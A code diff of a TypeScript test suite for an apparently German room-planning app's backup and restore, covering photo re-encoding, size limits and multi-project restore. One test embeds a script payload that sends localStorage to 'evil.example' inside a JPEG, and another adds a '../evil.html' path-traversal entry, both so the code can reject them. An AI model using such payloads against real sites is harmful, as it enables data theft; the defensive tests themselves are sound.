@@ -1,22 +1,38 @@
 import 'fake-indexeddb/auto';
-import { strToU8, zipSync } from 'fflate';
+import { strFromU8, strToU8, zipSync } from 'fflate';
 import { beforeEach, describe, expect, it } from 'vitest';
 import { sequentialIds } from '#lib/core/ids.ts';
+import type { Project } from '#lib/core/schema.ts';
 import { sha256Hex } from '#lib/features/photos/hash.ts';
+import type { Reencode } from '#lib/features/photos/reencode.ts';
+import { minimalJpeg, minimalWebp, svgImage } from '#lib/features/photos/testImages.ts';
 import { db } from '#lib/state/db.ts';
 import { getPhoto, loadProject, putPhoto, saveProject } from '#lib/state/persistence.ts';
 import {
 	BackupError,
 	createBackup,
+	createFullBackup,
 	parseBackup,
+	parseBackupSet,
 	photoHashes,
 	projectExists,
-	restoreBackup
+	restoreBackup,
+	restoreBackupSet
 } from './backup.ts';
 import { furnishedProject, testPng } from './testing.ts';
 
-async function seed() {
-	const bytes = testPng(80, 60, 90);
+const seen: string[] = [];
+
+const reencode: Reencode = async (bytes, kind) => {
+	seen.push(kind);
+	const out = strToU8(`reencoded-${kind}-${bytes.length}`);
+	const hash = await sha256Hex(out);
+	const blob = new Blob([out as BlobPart], { type: 'image/png' });
+	return { hash, blob, thumbnail: blob, w: 32, h: 24 };
+};
+
+async function seed(shade = 90) {
+	const bytes = testPng(80, 60, shade);
 	const hash = await sha256Hex(bytes);
 	const project = furnishedProject(hash);
 	await putPhoto({
@@ -31,7 +47,25 @@ async function seed() {
 	return { project, hash, bytes };
 }
 
+async function archiveWithPhoto(bytes: Uint8Array, project: Project = furnishedProject()) {
+	const hash = await sha256Hex(bytes);
+	const withHash = furnishedProject(hash);
+	withHash.id = project.id;
+	return {
+		hash,
+		archive: zipSync({
+			'project.json': strToU8(JSON.stringify(withHash)),
+			[`photos/${hash}.jpg`]: bytes
+		})
+	};
+}
+
+async function blobBytes(blob: Blob): Promise<Uint8Array> {
+	return new Uint8Array(await blob.arrayBuffer());
+}
+
 beforeEach(async () => {
+	seen.length = 0;
 	await Promise.all(db.tables.map((table) => table.clear()));
 });
 
@@ -48,47 +82,70 @@ describe('backup roundtrip', () => {
 		expect([...parsed.photos.keys()]).toEqual([hash]);
 	});
 
-	it('restores into an empty database with the photo', async () => {
-		const { project, hash, bytes } = await seed();
+	it('restores into an empty database with a freshly encoded photo', async () => {
+		const { project, hash } = await seed();
 		const { blob } = await createBackup(project);
 		await Promise.all(db.tables.map((table) => table.clear()));
 		expect(await projectExists(project.id)).toBe(false);
-		const parsed = parseBackup(new Uint8Array(await blob.arrayBuffer()));
-		const restored = await restoreBackup(parsed, { mode: 'replace' });
+		const parsed = parseBackup(await blobBytes(blob));
+		const restored = await restoreBackup(parsed, { mode: 'keep', reencode });
 		expect(restored.missingPhotos).toBe(0);
+		expect(restored.copied).toBe(false);
+		expect(seen).toEqual(['png']);
 		const loaded = await loadProject(project.id);
 		expect(loaded?.name).toBe(project.name);
-		expect(loaded?.rooms[0].photos[0].hash).toBe(hash);
-		const photo = await getPhoto(hash);
-		expect(photo?.blob.size).toBe(bytes.length);
-		expect(photo?.w).toBe(64);
+		const stored = loaded?.rooms[0].photos[0];
+		expect(stored?.hash).not.toBe(hash);
+		expect(stored).toMatchObject({ w: 32, h: 24 });
+		const photo = await getPhoto(stored!.hash);
+		expect(photo?.blob.type).toBe('image/jpeg');
+		expect(photo?.thumbnail.type).toBe('image/jpeg');
+		expect(strFromU8(await blobBytes(photo!.blob))).toMatch(/^reencoded-png-/);
+		expect(await getPhoto(hash)).toBeUndefined();
 		expect((await db.sync.get(project.id))?.dirty).toBe(true);
 	});
 
-	it('replaces an existing project', async () => {
+	it('never overwrites a project with the same id but adds a copy', async () => {
 		const { project } = await seed();
 		const { blob } = await createBackup(project);
 		await saveProject({ ...project, name: 'Geändert', rooms: [] });
 		expect(await projectExists(project.id)).toBe(true);
-		const parsed = parseBackup(new Uint8Array(await blob.arrayBuffer()));
-		await restoreBackup(parsed, { mode: 'replace' });
-		const loaded = await loadProject(project.id);
-		expect(loaded?.name).toBe(project.name);
-		expect(loaded?.rooms).toHaveLength(2);
+		const parsed = parseBackup(await blobBytes(blob));
+		const restored = await restoreBackup(parsed, {
+			mode: 'keep',
+			copySuffix: 'Kopie',
+			newId: sequentialIds('copy'),
+			reencode
+		});
+		expect(restored.copied).toBe(true);
+		expect(restored.project.id).toBe('copy-1');
+		expect(restored.project.name).toBe('Wohnung Müller-Köhler (Kopie)');
+		expect((await loadProject(project.id))?.name).toBe('Geändert');
+		expect((await loadProject('copy-1'))?.rooms).toHaveLength(2);
 	});
 
-	it('creates a copy with a new id and keeps the original', async () => {
+	it('treats the id of a deleted project as taken', async () => {
 		const { project } = await seed();
 		const { blob } = await createBackup(project);
-		const parsed = parseBackup(new Uint8Array(await blob.arrayBuffer()));
+		await db.projects.put({ ...project, deleted: true, rooms: [], variants: [] });
+		const parsed = parseBackup(await blobBytes(blob));
+		const restored = await restoreBackup(parsed, { mode: 'keep', reencode });
+		expect(restored.copied).toBe(true);
+		expect(restored.project.id).not.toBe(project.id);
+		expect((await db.projects.get(project.id))?.deleted).toBe(true);
+	});
+
+	it('creates a copy with a new id when asked and keeps the original', async () => {
+		const { project } = await seed();
+		const { blob } = await createBackup(project);
+		const parsed = parseBackup(await blobBytes(blob));
 		const restored = await restoreBackup(parsed, {
 			mode: 'copy',
 			copySuffix: 'Kopie',
-			newId: sequentialIds('copy')
+			newId: sequentialIds('copy'),
+			reencode
 		});
 		expect(restored.project.id).toBe('copy-1');
-		expect(restored.project.name).toBe('Wohnung Müller-Köhler (Kopie)');
-		expect((await loadProject('copy-1'))?.rooms).toHaveLength(2);
 		expect((await loadProject(project.id))?.name).toBe(project.name);
 	});
 
@@ -98,12 +155,13 @@ describe('backup roundtrip', () => {
 			'project.json': strToU8(JSON.stringify(project)),
 			[`photos/${hash}.jpg`]: strToU8('not the original bytes')
 		});
-		const restored = await restoreBackup(parseBackup(archive), { mode: 'copy' });
+		const restored = await restoreBackup(parseBackup(archive), { mode: 'copy', reencode });
 		expect(restored.missingPhotos).toBe(1);
+		expect(seen).toEqual([]);
 		await db.photos.clear();
 		const missing = await restoreBackup(
 			parseBackup(zipSync({ 'project.json': strToU8(JSON.stringify(project)) })),
-			{ mode: 'replace' }
+			{ mode: 'copy', reencode }
 		);
 		expect(missing.missingPhotos).toBe(1);
 		expect(await getPhoto(hash)).toBeUndefined();
@@ -119,10 +177,73 @@ describe('backup roundtrip', () => {
 	});
 });
 
-describe('parseBackup errors', () => {
-	const code = (data: Uint8Array) => {
+describe('image validation on restore', () => {
+	async function restoreBytes(bytes: Uint8Array) {
+		const { archive } = await archiveWithPhoto(bytes);
+		const restored = await restoreBackup(parseBackup(archive), { mode: 'copy', reencode });
+		return { restored, photos: await db.photos.count() };
+	}
+
+	it('accepts JPEG, PNG and WebP and re-encodes each one', async () => {
+		for (const bytes of [minimalJpeg(), testPng(), minimalWebp()]) {
+			await db.photos.clear();
+			const { restored, photos } = await restoreBytes(bytes);
+			expect(restored.missingPhotos).toBe(0);
+			expect(photos).toBe(1);
+		}
+		expect(seen).toEqual(['jpeg', 'png', 'webp']);
+	});
+
+	it('rejects an SVG even when it is named like a photo', async () => {
+		const { restored, photos } = await restoreBytes(svgImage());
+		expect(restored.rejectedPhotos).toBe(1);
+		expect(restored.missingPhotos).toBe(1);
+		expect(photos).toBe(0);
+		expect(seen).toEqual([]);
+	});
+
+	it('rejects a JPEG that carries a script and stores nothing of it', async () => {
+		const polyglot = minimalJpeg(64, 48, '<script>fetch("//evil.example/"+localStorage)</script>');
+		const { restored, photos } = await restoreBytes(polyglot);
+		expect(restored.rejectedPhotos).toBe(1);
+		expect(photos).toBe(0);
+		expect(seen).toEqual([]);
+	});
+
+	it('rejects a PNG with absurd dimensions before decoding it', async () => {
+		const { restored } = await restoreBytes(minimalJpeg(40_000, 40_000));
+		expect(restored.rejectedPhotos).toBe(1);
+		expect(seen).toEqual([]);
+	});
+
+	it('treats an image that cannot be decoded as rejected', async () => {
+		const { archive } = await archiveWithPhoto(testPng());
+		const failing: Reencode = async () => {
+			throw new Error('decode');
+		};
+		const restored = await restoreBackup(parseBackup(archive), {
+			mode: 'copy',
+			reencode: failing
+		});
+		expect(restored.rejectedPhotos).toBe(1);
+		expect(await db.photos.count()).toBe(0);
+	});
+
+	it('never keeps the original bytes of an imported image', async () => {
+		const png = testPng(70, 50, 33);
+		await restoreBytes(png);
+		const [stored] = await db.photos.toArray();
+		const original = await sha256Hex(png);
+		expect(stored.hash).not.toBe(original);
+		expect(stored.blob.type).toBe('image/jpeg');
+		expect(strFromU8(await blobBytes(stored.blob))).toBe(`reencoded-png-${png.length}`);
+	});
+});
+
+describe('limits and errors', () => {
+	const code = (data: Uint8Array, limits = {}) => {
 		try {
-			parseBackup(data);
+			parseBackup(data, limits);
 		} catch (error) {
 			return error instanceof BackupError ? error.code : 'other';
 		}
@@ -148,5 +269,156 @@ describe('parseBackup errors', () => {
 			'project.json': strToU8(JSON.stringify({ ...project, schemaVersion: 99 }))
 		});
 		expect(code(archive)).toBe('tooNew');
+	});
+
+	it('rejects a backup written by a newer format', async () => {
+		const { project } = await seed();
+		const archive = zipSync({
+			'backup.json': strToU8(JSON.stringify({ format: 'roomx-backup', version: 9 })),
+			'project.json': strToU8(JSON.stringify(project))
+		});
+		expect(code(archive)).toBe('tooNew');
+	});
+
+	it('rejects files above the size limits with a clear code', async () => {
+		const { project } = await seed();
+		const json = strToU8(JSON.stringify(project));
+		const archive = zipSync({ 'project.json': json });
+		expect(code(archive, { fileBytes: 50 })).toBe('tooLarge');
+		expect(code(archive, { jsonBytes: json.length - 1 })).toBe('tooLarge');
+		expect(code(archive, { unpackedBytes: json.length - 1 })).toBe('tooLarge');
+		const photo = zipSync({
+			'project.json': json,
+			[`photos/${'a'.repeat(64)}.jpg`]: new Uint8Array(2000)
+		});
+		expect(code(photo, { imageBytes: 1000 })).toBe('tooLarge');
+	});
+
+	it('does not inflate an entry that claims to be huge', () => {
+		const big = new Uint8Array(30 * 1024 * 1024);
+		expect(code(zipSync({ 'project.json': big }))).toBe('tooLarge');
+	});
+
+	it('rejects archives with too many entries, photos or projects', async () => {
+		const { project } = await seed();
+		const json = strToU8(JSON.stringify(project));
+		const photos = Object.fromEntries(
+			Array.from({ length: 4 }, (_, i) => [`photos/${String(i).repeat(64)}.jpg`, new Uint8Array(4)])
+		);
+		expect(code(zipSync({ 'project.json': json, ...photos }), { photos: 3 })).toBe('tooMany');
+		expect(code(zipSync({ 'project.json': json, ...photos }), { entries: 3 })).toBe('tooMany');
+		const set = zipSync({ 'projects/1.json': json, 'projects/2.json': json });
+		expect(() => parseBackupSet(set, { projects: 1 })).toThrowError(BackupError);
+	});
+
+	it('ignores everything that is not project data or a photo', () => {
+		const archive = zipSync({
+			'project.json': strToU8('{"id":"a"}'),
+			'../evil.html': strToU8('<script>1</script>'),
+			'photos/x.svg': svgImage()
+		});
+		expect(code(archive)).toBe('invalid');
+	});
+});
+
+describe('backup of all projects', () => {
+	async function seedMany() {
+		const first = await seed(90);
+		const second = furnishedProject(first.hash);
+		second.id = 'second';
+		second.name = 'Ferienhaus';
+		const third = furnishedProject('b'.repeat(64));
+		third.id = 'third';
+		third.name = 'Büro';
+		await saveProject(second);
+		await saveProject(third);
+		return [first.project, second, third];
+	}
+
+	it('stores every project once and shares photos between them', async () => {
+		const projects = await seedMany();
+		const result = await createFullBackup(projects);
+		expect(result.projectCount).toBe(3);
+		expect(result.photoCount).toBe(1);
+		expect(result.missingPhotos).toBe(1);
+		const set = parseBackupSet(await blobBytes(result.blob));
+		expect(set.projects.map((project) => project.id).sort()).toEqual(
+			projects.map((project) => project.id).sort()
+		);
+		expect(set.photos.size).toBe(1);
+		expect(set.skipped).toBe(0);
+	});
+
+	it('restores all projects with their photos into an empty database', async () => {
+		const projects = await seedMany();
+		const { blob } = await createFullBackup(projects);
+		await Promise.all(db.tables.map((table) => table.clear()));
+		const set = parseBackupSet(await blobBytes(blob));
+		const result = await restoreBackupSet(set, { reencode });
+		expect(result).toMatchObject({ restored: 3, copies: 0, missingPhotos: 1, skipped: 0 });
+		expect(seen).toEqual(['png']);
+		for (const project of projects)
+			expect((await loadProject(project.id))?.name).toBe(project.name);
+		expect(await db.photos.count()).toBe(1);
+		const shared = (await loadProject('second'))?.rooms[0].photos[0].hash;
+		expect((await loadProject(projects[0].id))?.rooms[0].photos[0].hash).toBe(shared);
+	});
+
+	it('turns every project that already exists into a copy and changes nothing else', async () => {
+		const projects = await seedMany();
+		const { blob } = await createFullBackup(projects);
+		const progress: number[] = [];
+		const set = parseBackupSet(await blobBytes(blob));
+		const result = await restoreBackupSet(set, {
+			reencode,
+			copySuffix: 'Kopie',
+			onProgress: (done) => progress.push(done)
+		});
+		expect(result).toMatchObject({ restored: 3, copies: 3 });
+		expect(progress).toEqual([0, 1, 2, 3]);
+		expect(await db.projects.count()).toBe(6);
+		for (const project of projects)
+			expect((await loadProject(project.id))?.name).toBe(project.name);
+		const names = (await db.projects.toArray()).map((project) => project.name);
+		expect(names.filter((name) => name.endsWith('(Kopie)'))).toHaveLength(3);
+	});
+
+	it('skips damaged projects but keeps the rest', async () => {
+		const projects = await seedMany();
+		const files = zipSync({
+			'projects/1.json': strToU8(JSON.stringify(projects[0])),
+			'projects/2.json': strToU8('{"broken":'),
+			'projects/3.json': strToU8(JSON.stringify(projects[1]))
+		});
+		const set = parseBackupSet(files);
+		expect(set.projects).toHaveLength(2);
+		expect(set.skipped).toBe(1);
+	});
+
+	it('reads a backup of a single project as a set of one', async () => {
+		const { project } = await seed();
+		const { blob } = await createBackup(project);
+		const set = parseBackupSet(await blobBytes(blob));
+		expect(set.projects.map((entry) => entry.id)).toEqual([project.id]);
+	});
+
+	it('has nothing to restore from a zip without projects', () => {
+		expect(() => parseBackupSet(zipSync({ 'backup.json': strToU8('{}') }))).toThrowError(
+			BackupError
+		);
+	});
+
+	it('reads projects in numeric order', async () => {
+		const projects = await seedMany();
+		const entries: Record<string, Uint8Array> = {};
+		for (let index = 12; index >= 1; index--) {
+			entries[`projects/${index}.json`] = strToU8(
+				JSON.stringify({ ...projects[0], id: `p${index}` })
+			);
+		}
+		const set = parseBackupSet(zipSync(entries));
+		expect(set.projects.map((project) => project.id)).toEqual(
+			Array.from({ length: 12 }, (_, i) => `p${i + 1}`)
+		);
 	});
 });
